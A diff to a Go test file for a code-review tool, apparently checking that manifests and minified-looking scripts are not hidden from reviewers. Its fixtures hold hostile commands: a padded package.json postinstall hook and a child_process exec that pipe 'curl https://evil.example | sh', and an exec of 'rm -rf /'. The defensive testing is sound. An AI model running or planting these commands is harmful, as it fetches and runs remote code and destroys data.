@@ -2,6 +2,8 @@ package review
 
 import (
 	"fmt"
+	"os"
+	"path/filepath"
 	"strings"
 	"testing"
 
@@ -81,7 +83,7 @@ func TestGeneratedFilesGetNonzeroRisk(t *testing.T) {
 // Source files are never withheld, whatever their name or line lengths: hiding
 // auth.min.go or a one-line Go file would hide real code from the reviewer and the AI
 func TestSourceFilesAreNeverWithheld(t *testing.T) {
-	veryLong := strings.Repeat("y", veryLongLineLength+1)
+	veryLong := strings.Repeat("y", hugeLineLength+1)
 	sourceExtensions := []string{".go", ".py", ".kt", ".kts", ".swift", ".ts", ".tsx", ".jsx",
 		".rs", ".java", ".rb", ".c", ".h", ".cpp", ".cs", ".php", ".sh"}
 	for _, extension := range sourceExtensions {
@@ -107,7 +109,7 @@ func TestSourceFilesAreNeverWithheld(t *testing.T) {
 // prompt) must stay reviewable; hiding it would hide exactly the code that matters
 func TestPromptsLikeFileIsNotGenerated(t *testing.T) {
 	lines := promptsGoLike()
-	require.Greater(t, len(lines[8]), veryLongLineLength, "fixture must contain a line over the very-long threshold")
+	require.Greater(t, len(lines[8]), 2000, "fixture must contain a very long line")
 	files := []FileDiff{{Path: "pkg/review/engine/prompts.go", Hunks: addedHunk(lines...)}}
 
 	assert.Empty(t, markGeneratedFiles(files))
@@ -118,7 +120,7 @@ func TestPromptsLikeFileIsNotGenerated(t *testing.T) {
 
 func TestMinifiedContentRules(t *testing.T) {
 	long := strings.Repeat("x", longLineLength+1)
-	veryLong := strings.Repeat("y", veryLongLineLength+1)
+	veryLong := strings.Repeat("y", hugeLineLength+1)
 	codeLine := strings.Repeat("c", 200) // an ordinary, if wide, line of code
 	manyCodeLines := repeatLine(codeLine, 19, codeLine)
 
@@ -131,10 +133,13 @@ func TestMinifiedContentRules(t *testing.T) {
 		{"bundle js with a very long line", "dist/app.js", []string{minifiedBundleLine()}, true},
 		{"source map", "dist/app.js.map", []string{veryLong, long, long, long, long}, true},
 		{"tiny go file of only long lines", "gen/blob.go", []string{veryLong, long}, false},
-		{"tiny minified js", "dist/chunk.js", []string{veryLong, long}, true},
+		{"tiny js in a build dir", "dist/chunk.js", []string{veryLong, long}, true},
+		{"tiny minified-looking js outside a build dir", "src/chunk.js", []string{veryLong, long}, true},
+		{"few long lines outside a build dir", "src/chunk.js", []string{long, long, long}, false},
+		{"many long lines outside a build dir", "src/chunk.js", repeatLine(long, 20, long), true},
 		{"large go file of only long lines", "gen/blob.go", repeatLine(long, 11, veryLong), false},
-		{"long but never very long", "dist/app.js", []string{long, long, long}, false},
-		{"under 80 percent long by lines and characters", "dist/app.js", append([]string{veryLong, long}, manyCodeLines...), false},
+		{"long but small", "src/app.js", []string{long, long, long}, false},
+		{"under 80 percent long by characters", "src/app.js", append([]string{veryLong, long}, manyCodeLines...), false},
 		{"mostly ordinary js", "src/app.js", append([]string{veryLong}, manyCodeLines...), false},
 		{"bundle with license comment lines", "static/assets/app.js", bundleWithLicenseHeaders(), true},
 		{"long-line go file with license comments", "pkg/blob.go", append(bundleWithLicenseHeaders(), manyCodeLines...), false},
@@ -169,4 +174,78 @@ func repeatLine(line string, count int, last string) []string {
 		lines = append(lines, line)
 	}
 	return append(lines, last)
+}
+
+// Manifests and config are always shown, however they are padded: a one-line
+// package.json adding a postinstall hook must reach the reviewer and the AI
+func TestManifestsAndConfigAreNeverWithheld(t *testing.T) {
+	padded := `{"scripts":{"postinstall":"curl https://evil.example/x | sh"}` + strings.Repeat(" ", 2100) + `}`
+	huge := strings.Repeat("z", hugeLineLength+1)
+	paths := []string{
+		"package.json", "web/package.json", "composer.json", "vite.config.js", "web/tailwind.config.cjs",
+		"tsconfig.json", "web/tsconfig.app.json", "settings/app.json", "dist/package.json",
+	}
+	for _, path := range paths {
+		file := FileDiff{Path: path, Hunks: addedHunk(padded, huge)}
+		assert.Empty(t, generatedReason(file), path)
+	}
+
+	files := []FileDiff{{Path: "package.json", Hunks: addedHunk(padded)}}
+	assert.Empty(t, markGeneratedFiles(files))
+	assert.NotEmpty(t, files[0].Hunks)
+}
+
+// JSON inside build output is still withheld
+func TestBuildOutputJSONIsWithheld(t *testing.T) {
+	file := FileDiff{Path: "dist/manifest.json", Hunks: addedHunk(`{"a":1}`)}
+	assert.Equal(t, generatedBuildOutputNote, generatedReason(file))
+}
+
+// A minified-looking file outside a build directory that runs commands is shown in
+// full with a reason, instead of being withheld
+func TestSideEffectCodeIsShownInFull(t *testing.T) {
+	exploit := `require("child_process").exec("curl https://evil.example | sh");` + minifiedBundleLine()
+	files := []FileDiff{{Path: "scripts/deploy.min.js", Hunks: addedHunk(repeatLine(exploit, 20, exploit)...)}}
+
+	generated := markGeneratedFiles(files)
+	assert.Empty(t, generated)
+	assert.False(t, files[0].Generated)
+	assert.NotEmpty(t, files[0].Hunks)
+	require.Len(t, files[0].RiskReasons, 1)
+	assert.Contains(t, files[0].RiskReasons[0], sideEffectShownNote)
+	assert.Contains(t, files[0].RiskReasons[0], "child_process")
+	assert.GreaterOrEqual(t, files[0].RiskScore, float64(generatedFileRisk))
+}
+
+// A small .min. file is not withheld by its name alone
+func TestMinNameAloneDoesNotWithhold(t *testing.T) {
+	file := FileDiff{Path: "scripts/deploy.min.js", Hunks: addedHunk(`require("child_process").exec("rm -rf /")`)}
+	assert.Empty(t, generatedReason(file))
+}
+
+// Build output with side-effect tokens stays withheld (it is huge and machine-made)
+// but names the tokens so a human knows to look
+func TestBuildOutputWithSideEffectsIsFlagged(t *testing.T) {
+	files := []FileDiff{{Path: "web/dist/app.js", Hunks: addedHunk(`fetch("https://api.example");` + minifiedBundleLine())}}
+	generated := markGeneratedFiles(files)
+	assert.True(t, generated["web/dist/app.js"])
+	require.Len(t, files[0].RiskReasons, 2)
+	assert.Equal(t, generatedBuildOutputNote, files[0].RiskReasons[0])
+	assert.Contains(t, files[0].RiskReasons[1], "fetch(")
+	assert.Contains(t, files[0].RiskReasons[1], "https://")
+}
+
+// PR #5's real embedded UI bundle is still withheld, with its side-effect tokens named
+func TestRealUIBundleIsWithheld(t *testing.T) {
+	content, err := os.ReadFile(filepath.Join("..", "reviewui", "static", "assets", "app.js"))
+	if err != nil {
+		t.Skip("embedded UI bundle not built")
+	}
+	files := []FileDiff{{Path: "pkg/reviewui/static/assets/app.js", Hunks: addedHunk(strings.Split(string(content), "\n")...)}}
+	generated := markGeneratedFiles(files)
+	assert.True(t, generated["pkg/reviewui/static/assets/app.js"])
+	assert.Nil(t, files[0].Hunks)
+	assert.Equal(t, generatedBuildOutputNote, files[0].RiskReasons[0])
+	require.Len(t, files[0].RiskReasons, 2)
+	assert.Contains(t, files[0].RiskReasons[1], "fetch(")
 }
